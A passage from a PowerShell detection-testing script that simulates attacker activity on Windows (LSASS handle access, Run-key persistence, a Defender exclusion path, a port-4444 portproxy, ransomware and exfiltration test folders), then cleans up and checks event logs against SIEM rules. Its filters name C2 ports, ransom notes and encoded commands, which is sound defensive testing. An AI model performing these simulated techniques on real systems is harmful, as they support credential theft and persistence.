                if ($hDbg -ne [IntPtr]::Zero) {
                    Start-Sleep -Milliseconds 600
                    [SOCLat]::CloseHandle($hDbg) | Out-Null
                }
            }
        } catch {}
        # Additionally spawn an elevated process to ensure EID 4672 (Special Privileges)
        try {
            $pe = Start-Process powershell.exe `
                -ArgumentList "-NoProfile -WindowStyle Hidden -Command [Security.Principal.WindowsIdentity]::GetCurrent() | Out-Null" `
                -PassThru -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 600
            if ($pe -and !$pe.HasExited) { try { $pe.Kill() } catch {} }
        } catch {}
        Add-R 4673 "SIEMRules" "TRIGGERED" "RULE-AD05 SeDebugPrivilege LSASS open" "T1134"
        Add-R 4672 "SIEMRules" "TRIGGERED" "RULE-AD05 Special privileges assigned at logon" "T1134"
        SIEM "RULE-AD05" "Sensitive Privilege Use: SeDebugPrivilege Invoked (QRadar: Sensitive Priv Rule)"
        Confirm-SIEMRule -EventID 4673 -RuleId 'RULE-AD05' -WindowSeconds 8
        P

    } else {
        Write-Host "  [DRY RUN] All 95 SIEM rules would fire." -ForegroundColor Cyan
    }
}


# ==============================================================================
#  FINAL CLEANUP
# ==============================================================================
if (-not $DryRun) {
    Write-Host ""
    Write-Host "  [*] Cleaning up all soc_* test objects..." -ForegroundColor DarkGray
    Del-User $TestUser; Del-User $TestUser2; Del-User $TestDisabled
    try { sc.exe delete $TestService 2>$null | Out-Null } catch {}
    try { Unregister-ScheduledTask -TaskName $TestTask -Confirm:$false -ErrorAction SilentlyContinue } catch {}
    Remove-Item $TestRegKey    -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $TestDir       -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $TestRansomDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $TestExfilDir  -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\soc_*_$RND*" -Force -ErrorAction SilentlyContinue
    # FIX-PROD-03: Remove RULE-83 Run key left in HKCU after test
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "soc_r83_$RND" -ErrorAction SilentlyContinue
    # Remove RULE-93 Defender exclusion path left after test
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\SOC_R93" -ErrorAction SilentlyContinue
    # Remove netsh portproxy from RULE-75
    netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=127.0.0.1 2>$null | Out-Null
    # Restore audit policies
    @("Logon","Account Lockout","User Account Management","Process Creation","Registry","File System",
      "Audit Policy Change","Sensitive Privilege Use","Directory Service Changes",
      "Kerberos Authentication Service","Kerberos Service Ticket Operations","Credential Validation",
      "Filtering Platform Connection","Other Object Access Events","Detailed File Share","File Share",
      "Special Logon","Computer Account Management","Security Group Management") | ForEach-Object { Set-AuditPol $_ }
    Write-Host "  [*] Cleanup complete. Audit policies restored." -ForegroundColor Green
}


# ==============================================================================
#  FINAL REPORT
# ==============================================================================
$elapsed = [math]::Round(((Get-Date) - $ScriptStart).TotalSeconds, 1)
Write-Host ""
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host ("  NEXUS SOC RESULTS SUMMARY  |  " + $elapsed + " sec elapsed") -ForegroundColor White  # FIX-V25-04
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host ("  TRIGGERED  : {0}" -f $Script:Triggered) -ForegroundColor Green
Write-Host ("  PARTIAL    : {0}" -f $Script:Partial)   -ForegroundColor Yellow
Write-Host ("  SKIPPED    : {0}" -f $Script:Skipped)   -ForegroundColor DarkGray
Write-Host ("  ERRORS     : {0}" -f $Script:Errors)    -ForegroundColor Red
Write-Host ""

if (-not $DryRun) {
    Write-Host "  EVENT VERIFICATION (Security/System/Sysmon/PS since script start):" -ForegroundColor White
    $verResults = @()
    $uniqueEvents = $Script:Results | Where-Object { $_.Status -eq 'TRIGGERED' } | Select-Object -ExpandProperty EventID -Unique
    foreach ($eid in $uniqueEvents) {
        $secCount   = (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=$eid; StartTime=$ScriptStart} -ErrorAction SilentlyContinue | Measure-Object).Count
        $sysCount   = (Get-WinEvent -FilterHashtable @{LogName='System';   Id=$eid; StartTime=$ScriptStart} -ErrorAction SilentlyContinue | Measure-Object).Count
        # Sysmon EIDs live in Sysmon/Operational (EID 1-30 range)
        $smonCount  = 0
        if ($sysmonOK -and $eid -ge 1 -and $eid -le 30) {
            $smonCount = (Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=$eid; StartTime=$ScriptStart} -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        # PS ScriptBlock EID 4104 lives in PowerShell/Operational
        $psCount    = 0
        if ($eid -eq 4104) {
            $psCount = (Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=$eid; StartTime=$ScriptStart} -ErrorAction SilentlyContinue | Measure-Object).Count
        }
        $total = $secCount + $sysCount + $smonCount + $psCount
        $verResults += [PSCustomObject]@{
            EventID       = $eid
            SecurityCount = $secCount
            SystemCount   = $sysCount
            SysmonCount   = $smonCount
            PSCount       = $psCount
            Total         = $total
            Verified      = if ($total -gt 0) { 'YES' } else { 'NO' }
        }
    }

    $eidLookup = @{}
    foreach ($row in $verResults) { $eidLookup[$row.EventID] = $row }

    foreach ($r in $Script:Results) {
        if ($r.Category -eq 'SIEMRules' -and $r.Status -eq 'TRIGGERED') {
            $vr = $eidLookup[$r.EventID]
            if ($vr -and $vr.Total -gt 0) {
                $r.Method = "{0} [VERIFIED]" -f $r.Method
            } else {
                $Script:Triggered--
                $Script:Partial++
                $r.Status = 'PARTIAL'
                $r.Method = "{0} [EVENT NOT FOUND]" -f $r.Method
            }
        }
    }

    foreach ($row in $verResults | Sort-Object EventID) {
        $logParts = @()
        if ($row.SecurityCount -gt 0) { $logParts += "Sec=$($row.SecurityCount)" }
        if ($row.SystemCount   -gt 0) { $logParts += "Sys=$($row.SystemCount)"   }
        if ($row.SysmonCount   -gt 0) { $logParts += "Smon=$($row.SysmonCount)"  }
        if ($row.PSCount       -gt 0) { $logParts += "PS=$($row.PSCount)"        }
        $logStr = if ($logParts.Count -gt 0) { $logParts -join " | " } else { "none" }
        $color  = if ($row.Verified -eq 'YES') { "Green" } else { "Red" }
        Write-Host ("    EID {0,-5} | Total={1,4} | {2,-35} | {3}" -f $row.EventID, $row.Total, $logStr, $row.Verified) -ForegroundColor $color
    }

    if ($BaselineDiff) {
        Write-Host ""
        Write-Host "  BASELINE DIFF (net-new events since script start):" -ForegroundColor White
        foreach ($row in $verResults | Sort-Object EventID) {
            Write-Host ("    EID {0,-5} | Net-New: {1}" -f $row.EventID, $row.Total) -ForegroundColor DarkGray
        }
    }

    Write-Host ""
    Write-Host "  MITRE ATTACK COVERAGE:" -ForegroundColor White
    $tech = $Script:Results | Where-Object { $_.MITRE } | Group-Object MITRE
    foreach ($t in $tech | Sort-Object Name) {
        $hasTrig = ($t.Group | Where-Object { $_.Status -eq 'TRIGGERED' }).Count -gt 0
        $hasPart = ($t.Group | Where-Object { $_.Status -eq 'PARTIAL' }).Count -gt 0
        if ($hasTrig) { $status = 'TRIGGERED' }
        elseif ($hasPart) { $status = 'PARTIAL' }
        else { $status = 'NONE' }
        $namePadded = $t.Name.PadRight(16)
        Write-Host ("    " + $namePadded + " | " + $status) -ForegroundColor DarkGray
    }
}

Write-Host ""

# ── DASHBOARD SECTION ──────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host "   NEXUS SOC Intelligence Portal  |  Production" -ForegroundColor Cyan
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host ""

if (-not $ViewOnly) {
    Write-Host "  Select event time window:" -ForegroundColor White
    Write-Host "    [1] 30 minutes (tight test window)" -ForegroundColor Green
    Write-Host "    [2] 1 hour" -ForegroundColor Cyan
    Write-Host "    [3] 2 hours" -ForegroundColor Yellow
    Write-Host "    [4] 24 hours (full day)" -ForegroundColor DarkGray
    Write-Host ""
    $sel = Read-Host "  Enter choice (1-4) [default: 2]"
    # FIX-V25-02: Added explicit case "2" (1 hour). Was falling through to default which
    # happened to produce the same result, but made the intent unclear and fragile.
    $Hours        = switch ($sel) { "1" {1} "2" {1} "3" {2} "4" {24} default {1} }
    $DashboardHours = switch ($sel) { "1" {1} "2" {1} "3" {2} "4" {24} default {1} }
    $DefaultWindow  = switch ($sel) { "1" {"30m"} "2" {"1h"} "3" {"2h"} "4" {"24h"} default {"1h"} }
} else {
    $DashboardHours = $Hours
    $DefaultWindow  = "${Hours}h"
}

Write-Host ("  [*] Collecting events from last {0} hour(s)..." -f $DashboardHours) -ForegroundColor DarkGray

# ── EVENT COLLECTION HELPERS ──────────────────────────────────────────────────
function Get-EventField2 {
    param($Event,[string]$FieldName)
    try {
        $xml = [xml]$Event.ToXml()
        $ns  = New-Object System.Xml.XmlNamespaceManager($xml.NameTable)
        $ns.AddNamespace("e","http://schemas.microsoft.com/win/2004/08/events/event")
        $node = $xml.SelectSingleNode("//e:Data[@Name='$FieldName']",$ns)
        if ($node) { return $node.InnerText.Trim() }
        $node2 = $xml.SelectSingleNode("//Data[@Name='$FieldName']")
        if ($node2) { return $node2.InnerText.Trim() }
    } catch {}
    return ""
}

function Get-SysmonField2 {
    param($Event,[string]$FieldName)
    try { $xml = [xml]$Event.ToXml(); foreach ($n in $xml.Event.EventData.Data) { if ($n.Name -eq $FieldName) { return $n.'#text'.Trim() } } } catch {}
    return ""
}

function Query-Log2 {
    param([string]$LogName,[int]$EventId,[datetime]$Since,[int]$Max=1000)
    try { return @(Get-WinEvent -FilterHashtable @{LogName=$LogName;Id=$EventId;StartTime=$Since} -MaxEvents $Max -ErrorAction Stop) } catch { return @() }
}

function Is-SOCEvent {
    param($ev,[string]$LogSource)
    # Primary filter: anything with soc_ marker or this run's $RND or test-specific patterns
    $fields = @(
        (Get-EventField2 $ev "TargetUserName"),
        (Get-EventField2 $ev "SubjectUserName"),
        (Get-EventField2 $ev "ServiceName"),
        (Get-EventField2 $ev "TaskName"),
        (Get-EventField2 $ev "ObjectName"),
        (Get-EventField2 $ev "CommandLine"),
        (Get-EventField2 $ev "NewProcessName"),
        (Get-EventField2 $ev "FileName")
    )
    foreach ($f in $fields) { if ($f -match "soc_|README_DECRYPT|HOW_TO_DECRYPT|SOCTEST|SOC_BYPASS|SOC_WMI|SOC_MALWARE|SOC_EXFIL|SOC_RANSOM|SOC_NTL|SOCPC|soc_ransom|soc_exfil|soc_mal|soc_$RND" -or $f -match "soc_u_|soc_dis_|soc_grp_|soc_svc_|soc_tsk_|soc_rdp|soc_rad|soc_r") { return $true } }
    if ($LogSource -eq "Sysmon") {
        # FIX-V25-01: Added missing Sysmon fields DestinationPort, DestinationIp, QueryName,
        # TargetImage, ParentImage. Without these, EID-3 (network), EID-10 (proc access),
        # EID-22 (DNS) events from RULE-85/86/88/91/92 were never matched → blank timeline.
        $sFields = @(
            (Get-SysmonField2 $ev "Image"),
            (Get-SysmonField2 $ev "CommandLine"),
            (Get-SysmonField2 $ev "TargetFilename"),
            (Get-SysmonField2 $ev "TargetObject"),
            (Get-SysmonField2 $ev "TargetImage"),
            (Get-SysmonField2 $ev "ParentImage"),
            (Get-SysmonField2 $ev "DestinationPort"),
            (Get-SysmonField2 $ev "DestinationIp"),
            (Get-SysmonField2 $ev "QueryName")
        )
        foreach ($f in $sFields) {
            # soc_* artifact match (catches soc_r50 through soc_r99 and all others)
            if ($f -match "soc_|README_DECRYPT|HOW_TO_DECRYPT|\.enc$|\.locked$|soc_ransom|soc_exfil|soc_mal|soc_d_|soc_$RND") { return $true }
            # Port-based: RULE-85 (4444 C2), RULE-92 (8081 local C2)
            if ($f -match "^4444$|^8081$|^8080$") { return $true }
            # DNS-based: RULE-88 (malware domain), RULE-77 (DoH)
            if ($f -match "malware\.|cloudflare-dns|dns\.google|test\.local") { return $true }
            # Process-based: RULE-86 (lsass access), RULE-91 (msbuild)
            if ($f -match "lsass\.exe|msbuild\.exe") { return $true }
            # EncodedCommand indicator: RULE-81
            if ($f -match "-EncodedCommand|-Encoded|-Enc\s|SQBFAFgA") { return $true }
        }
    }
    return $false
}

$StartTime = (Get-Date).AddHours(-$DashboardHours)

# ── COLLECT EVENTS ─────────────────────────────────────────────────────────────
# FIX-V26-02: Added missing EIDs seen in event verification but absent from collection:
# 4727 (global group member added w/ external), 4729/4730 (group member removed/group deleted),
# 4735 (local group changed), 4742 (computer account changed), 4778/4779 (session connect/disconnect),
# 5141 (AD object deleted). Without these, SIEM rules that fire them had Count=0 → NOT FIRED.
$secEIDs = @(104,1102,4104,4616,4624,4625,4634,4648,4649,4656,4657,4660,4662,4663,4672,4673,
             4688,4689,4697,4698,4702,4719,4720,4722,4723,4724,4725,4726,4727,4728,4729,4730,
             4731,4732,4733,4734,4735,4737,4738,4739,4740,4741,4742,4743,4756,4767,4768,4769,
             4770,4776,4778,4779,4946,5136,5137,5140,5141,5142,5145,7034,7036,7040,7045,
             4799)

$RawSec=[System.Collections.Generic.List[object]]::new()
$RawSys=[System.Collections.Generic.List[object]]::new()
$RawSysmon=[System.Collections.Generic.List[object]]::new()
$RawPS=[System.Collections.Generic.List[object]]::new()
$RawTask=[System.Collections.Generic.List[object]]::new()

Write-Host "  [*] Querying Security log..." -ForegroundColor DarkGray
$qi=0; foreach ($eid in $secEIDs) { $qi++; Write-Progress -Activity "Querying Security log" -Status "EID $eid" -PercentComplete ([int](($qi/$secEIDs.Count)*100)); foreach ($e in (Query-Log2 "Security" $eid $StartTime)) { $RawSec.Add($e) } }
Write-Progress -Activity "Querying Security log" -Completed

foreach ($eid in @(104,7034,7036,7040,7045)) { foreach ($e in (Query-Log2 "System" $eid $StartTime)) { $RawSys.Add($e) } }
foreach ($eid in @(4103,4104,4105)) { foreach ($e in (Query-Log2 "Microsoft-Windows-PowerShell/Operational" $eid $StartTime)) { $RawPS.Add($e) } }
foreach ($eid in @(106,140,141,200,201)) { foreach ($e in (Query-Log2 "Microsoft-Windows-TaskScheduler/Operational" $eid $StartTime)) { $RawTask.Add($e) } }
if ($sysmonOK) { Write-Host "  [*] Querying Sysmon..." -ForegroundColor DarkGray; foreach ($eid in @(1,2,3,5,6,7,8,10,11,12,13,14,15,17,18,19,20,21,22,23,25,26)) { foreach ($e in (Query-Log2 "Microsoft-Windows-Sysmon/Operational" $eid $StartTime)) { $RawSysmon.Add($e) } } }
# FIX-V26-02 (cont): Added Sysmon EID 5 (ProcessTerminate). Fired during test but not collected.

Write-Host ("  [+] Raw: Sec={0} Sys={1} Sysmon={2} PS={3} Task={4}" -f $RawSec.Count,$RawSys.Count,$RawSysmon.Count,$RawPS.Count,$RawTask.Count) -ForegroundColor Green

# ── NORMALIZE + FILTER ─────────────────────────────────────────────────────────
$EventMeta2 = @{
    104=@{Sev="HIGH";Cat="Defense Evasion";Desc="System log cleared"}
    1102=@{Sev="CRITICAL";Cat="Defense Evasion";Desc="Security log cleared"}
    4104=@{Sev="HIGH";Cat="PowerShell";Desc="PS Script Block logged"}
    4616=@{Sev="HIGH";Cat="Policy Changes";Desc="System time changed"}
    4624=@{Sev="MEDIUM";Cat="Authentication";Desc="Successful logon"}
    4625=@{Sev="HIGH";Cat="Authentication";Desc="Failed logon attempt"}
    4648=@{Sev="HIGH";Cat="Authentication";Desc="Explicit credential logon"}
    4649=@{Sev="CRITICAL";Cat="Kerberos";Desc="Kerberos replay attack"}
    4656=@{Sev="HIGH";Cat="Object Access";Desc="Handle to object requested"}
    4657=@{Sev="HIGH";Cat="Registry";Desc="Registry value modified"}
    4660=@{Sev="MEDIUM";Cat="Object Access";Desc="Object deleted"}
    4662=@{Sev="CRITICAL";Cat="AD Changes";Desc="AD object operation (DCSync)"}
    4663=@{Sev="HIGH";Cat="Object Access";Desc="Object access attempt"}
    4672=@{Sev="HIGH";Cat="Kerberos";Desc="Special privileges assigned"}
    4673=@{Sev="HIGH";Cat="Kerberos";Desc="Privileged service called"}
    4688=@{Sev="MEDIUM";Cat="Process";Desc="New process created"}
    4697=@{Sev="CRITICAL";Cat="Persistence";Desc="Service installed (Security)"}
    4698=@{Sev="HIGH";Cat="Persistence";Desc="Scheduled task created"}
    4702=@{Sev="HIGH";Cat="Persistence";Desc="Scheduled task modified"}
    4719=@{Sev="CRITICAL";Cat="Defense Evasion";Desc="Audit policy changed"}
    4720=@{Sev="HIGH";Cat="Account Lifecycle";Desc="User account created"}
    4722=@{Sev="MEDIUM";Cat="Account Lifecycle";Desc="User account enabled"}
    4723=@{Sev="MEDIUM";Cat="Account Lifecycle";Desc="Password change attempt"}
    4724=@{Sev="HIGH";Cat="Account Lifecycle";Desc="Password reset by admin"}
    4725=@{Sev="HIGH";Cat="Account Lifecycle";Desc="User account disabled"}
    4726=@{Sev="HIGH";Cat="Account Lifecycle";Desc="User account deleted"}
    4727=@{Sev="MEDIUM";Cat="Group Management";Desc="Security-enabled global group created"}
    4728=@{Sev="CRITICAL";Cat="Group Management";Desc="Member added to global group"}
    4729=@{Sev="MEDIUM";Cat="Group Management";Desc="Member removed from global group"}
    4730=@{Sev="HIGH";Cat="Group Management";Desc="Security-enabled global group deleted"}
    4731=@{Sev="MEDIUM";Cat="Group Management";Desc="Local security group created"}
    4732=@{Sev="CRITICAL";Cat="Group Management";Desc="Member added to Admins"}
    4733=@{Sev="MEDIUM";Cat="Group Management";Desc="Member removed from group"}
    4734=@{Sev="HIGH";Cat="Group Management";Desc="Local security group deleted"}
    4735=@{Sev="MEDIUM";Cat="Group Management";Desc="Security-enabled local group changed"}
    4737=@{Sev="MEDIUM";Cat="Group Management";Desc="Global security group changed"}
    4738=@{Sev="MEDIUM";Cat="Account Lifecycle";Desc="User account changed"}
    4739=@{Sev="HIGH";Cat="Policy Changes";Desc="Domain policy changed"}
    4740=@{Sev="HIGH";Cat="Account Lifecycle";Desc="User account locked out"}
    4741=@{Sev="HIGH";Cat="AD Changes";Desc="Computer account created"}
    4742=@{Sev="MEDIUM";Cat="AD Changes";Desc="Computer account changed"}
    4743=@{Sev="HIGH";Cat="AD Changes";Desc="Computer account deleted"}
    4756=@{Sev="CRITICAL";Cat="Group Management";Desc="Member added to universal group"}
    4767=@{Sev="MEDIUM";Cat="Account Lifecycle";Desc="User account unlocked"}
    4778=@{Sev="MEDIUM";Cat="Authentication";Desc="Session reconnected to window station"}
    4799=@{Sev="HIGH";Cat="Group Management";Desc="Privileged group membership enumerated (SAMR)"}
    4779=@{Sev="MEDIUM";Cat="Authentication";Desc="Session disconnected from window station"}
    4768=@{Sev="MEDIUM";Cat="Kerberos";Desc="Kerberos TGT requested"}
    4769=@{Sev="HIGH";Cat="Kerberos";Desc="Kerberos service ticket requested"}
    4770=@{Sev="HIGH";Cat="Kerberos";Desc="Kerberos ticket renewed"}
    4776=@{Sev="HIGH";Cat="Authentication";Desc="NTLM credential validation"}
    4946=@{Sev="HIGH";Cat="Network Policy";Desc="Firewall rule added"}
    5136=@{Sev="CRITICAL";Cat="AD Changes";Desc="AD DS object modified"}
    5137=@{Sev="HIGH";Cat="AD Changes";Desc="AD DS object created"}
    5140=@{Sev="HIGH";Cat="Object Access";Desc="Network share accessed"}
    5141=@{Sev="HIGH";Cat="AD Changes";Desc="AD DS object deleted"}
    5142=@{Sev="HIGH";Cat="Object Access";Desc="Network share added"}
    5145=@{Sev="MEDIUM";Cat="Object Access";Desc="Network share file accessed"}
    7036=@{Sev="HIGH";Cat="Service Control";Desc="Service state changed"}
    7040=@{Sev="MEDIUM";Cat="Service Control";Desc="Service start type changed"}
    7045=@{Sev="CRITICAL";Cat="Persistence";Desc="New service installed"}
    1=@{Sev="MEDIUM";Cat="Sysmon";Desc="[Sysmon] Process Create"}
    2=@{Sev="HIGH";Cat="Sysmon";Desc="[Sysmon] File creation time changed"}
    3=@{Sev="MEDIUM";Cat="Sysmon";Desc="[Sysmon] Network connection"}
    6=@{Sev="HIGH";Cat="Sysmon";Desc="[Sysmon] Driver loaded"}
    7=@{Sev="HIGH";Cat="Sysmon";Desc="[Sysmon] Image loaded"}
    8=@{Sev="CRITICAL";Cat="Sysmon";Desc="[Sysmon] CreateRemoteThread"}
    10=@{Sev="CRITICAL";Cat="Sysmon";Desc="[Sysmon] Process accessed"}
    11=@{Sev="MEDIUM";Cat="Sysmon";Desc="[Sysmon] File created"}
    13=@{Sev="HIGH";Cat="Sysmon";Desc="[Sysmon] Registry value set"}
    15=@{Sev="HIGH";Cat="Sysmon";Desc="[Sysmon] File stream created (ADS)"}
    19=@{Sev="CRITICAL";Cat="Sysmon";Desc="[Sysmon] WMI EventFilter created"}
    20=@{Sev="CRITICAL";Cat="Sysmon";Desc="[Sysmon] WMI EventConsumer created"}
    21=@{Sev="CRITICAL";Cat="Sysmon";Desc="[Sysmon] WMI FilterConsumerBinding"}
    22=@{Sev="MEDIUM";Cat="Sysmon";Desc="[Sysmon] DNS query"}
    23=@{Sev="HIGH";Cat="Sysmon";Desc="[Sysmon] File deleted"}
}

function Normalize-Ev {
    param($ev,[string]$LogSrc)
    $eid = $ev.Id
    $meta = if ($EventMeta2.ContainsKey($eid)) { $EventMeta2[$eid] } else { @{Sev="INFO";Cat="Other";Desc="Event $eid"} }
    $subjectUser = Get-EventField2 $ev "SubjectUserName"
    $targetUser  = Get-EventField2 $ev "TargetUserName"
    $logonType   = Get-EventField2 $ev "LogonType"
    $srcIP       = Get-EventField2 $ev "IpAddress"
    $procName    = (Get-EventField2 $ev "NewProcessName") -replace '.*\\',''
    $cmdLine     = Get-EventField2 $ev "CommandLine"
    $serviceName = Get-EventField2 $ev "ServiceName"
    $taskName    = Get-EventField2 $ev "TaskName"
    $regKey      = Get-EventField2 $ev "ObjectName"
    $shareName   = Get-EventField2 $ev "ShareName"
    $fileName    = Get-EventField2 $ev "FileName"
    if ($LogSrc -eq "Sysmon") {
        $procName  = (Get-SysmonField2 $ev "Image") -replace '.*\\',''
        $cmdLine   = Get-SysmonField2 $ev "CommandLine"
        $targetUser= Get-SysmonField2 $ev "User"
        $srcIP     = Get-SysmonField2 $ev "DestinationIp"
        $fileName  = if (Get-SysmonField2 $ev "TargetFilename") { Get-SysmonField2 $ev "TargetFilename" } else { Get-SysmonField2 $ev "ImageLoaded" }
    }
    $detail = switch ($eid) {
        4688 { if ($cmdLine) { "$procName | $cmdLine" } else { $procName } }
        4625 { "Type=$logonType User=$targetUser IP=$srcIP" }
        4624 { "Type=$logonType User=$targetUser IP=$srcIP" }
        4720 { "Created: $targetUser" }; 4726 { "Deleted: $targetUser" }
        4732 { "$targetUser -> Administrators" }; 4728 { "$targetUser -> Group" }
        4740 { "Locked: $targetUser" }; 4657 { "RegKey: $regKey" }
        4663 { "Object: $regKey" }; 7045 { "Service: $serviceName" }
        4698 { "Task: $taskName" }; 4702 { "Task: $taskName" }
        5140 { "Share: $shareName" }
        default { if ($procName) { "Process: $procName" } elseif ($targetUser) { "User: $targetUser" } elseif ($fileName) { "File: $fileName" } else { "" } }
    }
    return [PSCustomObject]@{
        Time=$ev.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss")
        # FIX-V23-01: Must use UTC-based epoch so JS Date.now() (UTC ms) and embedded epoch values match.
        # Old code: ($ev.TimeCreated - [datetime]"1970-01-01") uses local datetime arithmetic.
        # On any non-UTC timezone (e.g. IST UTC+5:30) this embeds epochs ~19800000ms AHEAD of JS Date.now(),
        # making every event.age = now-ep negative → rebuildTimeline bins nothing → timeline always empty.
        TimeSort=$ev.TimeCreated; TimeEpochMs=[long]($ev.TimeCreated.ToUniversalTime() - [datetime]::new(1970,1,1,0,0,0,0,[System.DateTimeKind]::Utc)).TotalMilliseconds
        EID=$eid; Severity=$meta.Sev; Category=$meta.Cat; Description=$meta.Desc
        Log=$LogSrc; Machine=$ev.MachineName
        SubjectUser=$subjectUser; TargetUser=$targetUser; LogonType=$logonType
        SourceIP=$srcIP; ProcessName=$procName; CmdLine=$cmdLine
        ServiceName=$serviceName; TaskName=$taskName; RegKey=$regKey
        ShareName=$shareName; FileName=$fileName; Detail=$detail
    }
}

Write-Host "  [*] Normalizing and filtering SOC-only events..." -ForegroundColor DarkGray

$AllEvents=[System.Collections.Generic.List[PSCustomObject]]::new()
$AllEvents_SOCOnly=[System.Collections.Generic.List[PSCustomObject]]::new()

foreach ($e in $RawSec)  { try { $n=Normalize-Ev $e "Security";  $AllEvents.Add($n); if (Is-SOCEvent $e "Security")   { $AllEvents_SOCOnly.Add($n) } } catch {} }
foreach ($e in $RawSys)  { try { $n=Normalize-Ev $e "System";    $AllEvents.Add($n); if (Is-SOCEvent $e "System")     { $AllEvents_SOCOnly.Add($n) } } catch {} }
foreach ($e in $RawPS)   { try { $n=Normalize-Ev $e "PowerShell";$AllEvents.Add($n); if (Is-SOCEvent $e "PowerShell") { $AllEvents_SOCOnly.Add($n) } } catch {} }
foreach ($e in $RawTask) { try { $n=Normalize-Ev $e "TaskSched"; $AllEvents.Add($n); if (Is-SOCEvent $e "TaskSched")  { $AllEvents_SOCOnly.Add($n) } } catch {} }
foreach ($e in $RawSysmon){ try { $n=Normalize-Ev $e "Sysmon";   $AllEvents.Add($n); if (Is-SOCEvent $e "Sysmon")    { $AllEvents_SOCOnly.Add($n) } } catch {} }

$SortedAll    = $AllEvents      | Sort-Object TimeSort -Descending
$SortedSOC    = $AllEvents_SOCOnly | Sort-Object TimeSort -Descending
$TotalAll     = $AllEvents.Count
$TotalSOC     = $AllEvents_SOCOnly.Count
$CritAll      = ($AllEvents      | Where-Object {$_.Severity -eq "CRITICAL"}).Count
$HighAll      = ($AllEvents      | Where-Object {$_.Severity -eq "HIGH"}).Count
$MedAll       = ($AllEvents      | Where-Object {$_.Severity -eq "MEDIUM"}).Count
$CritSOC      = ($AllEvents_SOCOnly | Where-Object {$_.Severity -eq "CRITICAL"}).Count
$HighSOC      = ($AllEvents_SOCOnly | Where-Object {$_.Severity -eq "HIGH"}).Count
$MedSOC       = ($AllEvents_SOCOnly | Where-Object {$_.Severity -eq "MEDIUM"}).Count

Write-Host ("  [+] Total events: {0}  |  SOC-tagged: {1}  (Critical={2} High={3} Med={4})" -f $TotalAll,$TotalSOC,$CritSOC,$HighSOC,$MedSOC) -ForegroundColor Green

# ── SIEM RULE EVALUATION ────────────────────────────────────────────────────────
Write-Host "  [*] Evaluating SIEM rules against SOC events..." -ForegroundColor DarkGray

function Count-SOCEvents {
    # DEFINITIVE FIX: Two-mode event counting for accurate SIEM rule evaluation.
    #
    # Mode 1 (default): Time-window mode.
    #   Counts ANY event with matching EID that occurred AFTER $ScriptStart.
    #   This is correct for SIEM rule evaluation: if the EID fired during the
    #   test run, the rule should be FIRED regardless of whether the triggering
    #   command had a soc_ marker. Commands like netsh, certutil, bcdedit, nslookup
    #   produce real security events with no soc_ in their fields -- time-window
    #   is the correct correlation anchor for a test run.
    #
    # Mode 2 (SOCTagged=$true): SOC-marker mode (legacy, used by dashboard table).
    #   Counts only events that Is-SOCEvent marks as SOC-tagged.
    #
    # ProcFilter: partial case-insensitive regex match against NewProcessName.
    #   "netsh" matches "C:\Windows\System32\netsh.exe" correctly.
    #   No regex escaping needed for simple process name strings.
    #
    param(
        [string]$Log,
        [int[]]$EIDs,
        [string]$ProcFilter = "",
        [string]$CmdFilter  = "",
        [switch]$SOCTagged       # when set, requires Is-SOCEvent match (dashboard use only)
    )
    $src = switch ($Log) {
        "Security"   { $RawSec    }
        "System"     { $RawSys    }
        "Sysmon"     { $RawSysmon }
        "PowerShell" { $RawPS     }
        default      { @()        }
    }
    $count = 0
    foreach ($ev in $src) {
        # EID filter
        if ($ev.Id -notin $EIDs) { continue }
        # Time filter: only events from this script run (replaces Is-SOCEvent for SIEM eval)
        if (-not $SOCTagged) {
            if ($ev.TimeCreated -lt $ScriptStart) { continue }
        } else {
            if (-not (Is-SOCEvent $ev $Log)) { continue }
        }
        # Process name filter (partial regex, case-insensitive)
        if ($ProcFilter) {
            $proc = Get-EventField2 $ev "NewProcessName"
            if ($Log -eq "Sysmon") { $proc = Get-SysmonField2 $ev "Image" }
            if ($proc -notmatch "(?i)$([regex]::Escape($ProcFilter))") { continue }
        }
        # Command line filter (direct regex substring match)
        if ($CmdFilter) {
            $cmd = Get-EventField2 $ev "CommandLine"
            if ($Log -eq "Sysmon") { $cmd = Get-SysmonField2 $ev "CommandLine" }
            if ($cmd -notmatch "(?i)$([regex]::Escape($CmdFilter))") { continue }
        }
        $count++
    }
    return $count
}

$SIEMResults=[System.Collections.Generic.List[PSCustomObject]]::new()
function Add-SIEMRule {
    param([string]$ID,[string]$Name,[string]$MITRE,[string]$Sev,[string]$Cat,[string]$Desc,[string]$DetLogic,[string]$Recommend,[int]$Count,[string[]]$EIDsChk,[string]$Skip="")
    $status = if ($Skip) {"SKIPPED"} elseif ($Count -gt 0) {"FIRED"} else {"NOT FIRED"}
    $SIEMResults.Add([PSCustomObject]@{RuleID=$ID;Name=$Name;MITRE=$MITRE;Severity=$Sev;Category=$Cat;Description=$Desc;DetectionLogic=$DetLogic;Recommendation=$Recommend;EventCount=$Count;Status=$status;EIDsChecked=($EIDsChk -join ", ");SkipReason=$Skip})
}

# Define all 95 SIEM rules with detection logic and recommendations
Add-SIEMRule "RULE-01" "Account Created and Deleted Same Session" "T1136/T1531" "HIGH" "Account Lifecycle" "EID 4720 AND 4726 both observed in session" "Alert when user account created (EID 4720) and deleted (EID 4726) in same session under 15 minutes" "Investigate who created the account and why it was immediately deleted. Check for backdoor account creation pattern." (([Math]::Min((Count-SOCEvents "Security" @(4720)),1) + [Math]::Min((Count-SOCEvents "Security" @(4726)),1))) @("4720","4726")

